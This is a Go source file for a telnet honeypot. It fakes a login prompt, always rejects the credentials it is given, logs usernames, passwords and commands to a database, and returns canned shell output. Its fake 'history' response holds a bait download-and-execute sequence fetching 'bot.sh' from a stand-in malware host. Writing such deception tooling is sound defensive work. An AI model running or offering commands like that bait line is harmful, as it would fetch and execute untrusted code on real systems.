package telnet

import (
	"bufio"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/casapps/caspot/internal/database"
)

type Honeypot struct {
	db       *database.DB
	config   *Config
	listener net.Listener
	mu       sync.RWMutex
	running  bool
}

type Config struct {
	Port           int
	LoginPrompt    string
	PasswordPrompt string
	FakeSystem     string
	Commands       []string
}

type telnetSession struct {
	conn           net.Conn
	db             *database.DB
	config         *Config
	authenticated  bool
	username       string
	sourceIP       string
	loginAttempts  int
}

func New(db *database.DB, config *Config) (*Honeypot, error) {
	return &Honeypot{
		db:     db,
		config: config,
	}, nil
}

func (h *Honeypot) Start() error {
	h.mu.Lock()
	defer h.mu.Unlock()

	if h.running {
		return fmt.Errorf("Telnet honeypot already running")
	}

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", h.config.Port))
	if err != nil {
		return fmt.Errorf("failed to listen on port %d: %w", h.config.Port, err)
	}

	h.listener = listener
	h.running = true

	go h.acceptConnections()

	fmt.Printf("Telnet honeypot started on port %d\n", h.config.Port)
	return nil
}

func (h *Honeypot) Stop() error {
	h.mu.Lock()
	defer h.mu.Unlock()

	if !h.running {
		return nil
	}

	h.running = false
	if h.listener != nil {
		h.listener.Close()
	}

	return nil
}

func (h *Honeypot) acceptConnections() {
	for h.running {
		conn, err := h.listener.Accept()
		if err != nil {
			if h.running {
				fmt.Printf("Failed to accept connection: %v\n", err)
			}
			continue
		}

		go h.handleConnection(conn)
	}
}

func (h *Honeypot) handleConnection(conn net.Conn) {
	defer conn.Close()

	sourceIP := strings.Split(conn.RemoteAddr().String(), ":")[0]

	event := &database.Event{
		EventType:   "connection",
		SourceIP:    sourceIP,
		DestPort:    h.config.Port,
		ServiceName: "telnet",
		Protocol:    "tcp",
		Severity:    "low",
	}
	h.db.LogEvent(event)

	session := &telnetSession{
		conn:     conn,
		db:       h.db,
		config:   h.config,
		sourceIP: sourceIP,
	}

	// Send telnet negotiation
	session.sendTelnetNegotiation()

	// Send login prompt
	time.Sleep(100 * time.Millisecond)
	session.write(h.config.LoginPrompt)

	scanner := bufio.NewScanner(conn)
	state := "login"

	for scanner.Scan() {
		input := strings.TrimSpace(scanner.Text())

		switch state {
		case "login":
			session.username = input
			session.write(h.config.PasswordPrompt)
			state = "password"

		case "password":
			password := input
			session.loginAttempts++

			event := &database.Event{
				EventType:   "authentication",
				SourceIP:    sourceIP,
				DestPort:    h.config.Port,
				ServiceName: "telnet",
				Protocol:    "tcp",
				Username:    session.username,
				Password:    password,
				Severity:    "high",
			}
			h.db.LogEvent(event)

			if session.loginAttempts >= 3 {
				session.write("\r\nToo many login attempts. Connection closed.\r\n")
				return
			}

			// Always fail authentication but make it look real
			time.Sleep(2 * time.Second)
			session.write("\r\nLogin incorrect\r\n\r\n")
			session.write(h.config.LoginPrompt)
			state = "login"

		case "authenticated":
			if input == "exit" || input == "logout" || input == "quit" {
				session.write("\r\nLogout\r\n")
				return
			}

			event := &database.Event{
				EventType:   "command",
				SourceIP:    sourceIP,
				DestPort:    h.config.Port,
				ServiceName: "telnet",
				Protocol:    "tcp",
				Command:     input,
				Username:    session.username,
				Severity:    "medium",
			}
			h.db.LogEvent(event)

			response := session.executeCommand(input)
			session.write(response)
			session.write("\r\n$ ")
		}
	}
}

func (s *telnetSession) sendTelnetNegotiation() {
	// IAC WILL ECHO
	s.conn.Write([]byte{255, 251, 1})
	// IAC WILL SUPPRESS GO AHEAD
	s.conn.Write([]byte{255, 251, 3})
	// IAC DO TERMINAL TYPE
	s.conn.Write([]byte{255, 253, 24})
	// IAC DO WINDOW SIZE
	s.conn.Write([]byte{255, 253, 31})
}

func (s *telnetSession) write(text string) {
	s.conn.Write([]byte(text))
}

func (s *telnetSession) executeCommand(command string) string {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return ""
	}

	cmd := parts[0]

	switch cmd {
	case "ls":
		return "\r\nbin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var"

	case "pwd":
		return "\r\n/home/user"

	case "whoami":
		return "\r\n" + s.username

	case "id":
		return fmt.Sprintf("\r\nuid=1000(%s) gid=1000(%s) groups=1000(%s)", s.username, s.username, s.username)

	case "uname":
		if len(parts) > 1 && parts[1] == "-a" {
			return "\r\n" + s.config.FakeSystem
		}
		return "\r\nLinux"

	case "ps":
		return `
  PID TTY          TIME CMD
    1 ?        00:00:01 init
    2 ?        00:00:00 kthreadd
  100 ?        00:00:00 telnetd
  150 pts/0    00:00:00 sh
  200 pts/0    00:00:00 ps`

	case "netstat":
		if len(parts) > 1 && (parts[1] == "-an" || parts[1] == "-a") {
			return `
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN`
		}
		return "\r\nActive Internet connections (w/o servers)"

	case "ifconfig":
		return `
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 1024  bytes 102400 (100.0 KB)
        TX packets 512  bytes 51200 (50.0 KB)`

	case "cat":
		if len(parts) > 1 {
			switch parts[1] {
			case "/etc/passwd":
				return `
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
` + s.username + ":x:1000:1000::/home/" + s.username + ":/bin/sh"
			case "/etc/hosts":
				return `
127.0.0.1       localhost
127.0.1.1       honeypot

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters`
			default:
				return fmt.Sprintf("\r\ncat: %s: No such file or directory", parts[1])
			}
		}
		return "\r\ncat: missing file operand"

	case "echo":
		if len(parts) > 1 {
			return "\r\n" + strings.Join(parts[1:], " ")
		}
		return "\r\n"

	case "cd":
		return ""

	case "history":
		return `
    1  ls -la
    2  cd /tmp
    3  wget http://malware.com/bot.sh
    4  chmod +x bot.sh
    5  ./bot.sh
    6  ps aux
    7  netstat -an`

	case "wget", "curl":
		if len(parts) > 1 {
			event := &database.Event{
				EventType:   "download_attempt",
				SourceIP:    s.sourceIP,
				DestPort:    s.config.Port,
				ServiceName: "telnet",
				Protocol:    "tcp",
				Command:     command,
				Payload:     parts[1],
				Username:    s.username,
				Severity:    "critical",
			}
			s.db.LogEvent(event)
			return fmt.Sprintf("\r\n%s: command not found", cmd)
		}
		return fmt.Sprintf("\r\n%s: missing URL", cmd)

	case "chmod", "chown":
		return ""

	case "mkdir", "rm", "mv", "cp":
		return ""

	case "help":
		return "\r\nAvailable commands: " + strings.Join(s.config.Commands, ", ")

	default:
		return fmt.Sprintf("\r\n%s: command not found", cmd)
	}
}